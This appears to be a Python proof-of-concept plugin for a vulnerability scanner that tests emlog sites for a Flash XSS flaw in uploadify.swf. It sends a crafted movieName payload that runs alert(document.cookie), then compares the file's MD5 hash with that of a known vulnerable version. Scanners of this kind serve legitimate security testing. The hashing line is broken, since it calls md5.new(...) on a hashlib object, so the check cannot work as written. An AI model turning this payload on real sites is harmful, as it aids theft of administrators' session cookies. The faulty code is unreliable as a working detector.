# Author:w8ay
# Name:测试DEMO

import HackRequests
import hashlib

def poc(arg, **kwargs):
    flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
    url = arg + "/include/lib/js/uploadify/uploadify.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}//"
    hack = HackRequests.hackRequests()
    hh = hack.http(url)
    if hh.status_code == 200:
        md5 = hashlib.md5()
        md5_value = md5.new(hh.content()).hexdigest()
        if md5_value == flash_md5:
            result = {
                "name": "emlog flash xss插件",  # 插件名称
                "content": "emlog后台上传组件存在flash xss，可能导致管理员账号密码被盗用",  # 插件返回内容详情，会造成什么后果。
                "url": url,  # 漏洞存在url
                "log": hh.log,
                "tag": "flash_xss"  # 漏洞标签
            }
            return result


if __name__ == "__main__":
    pass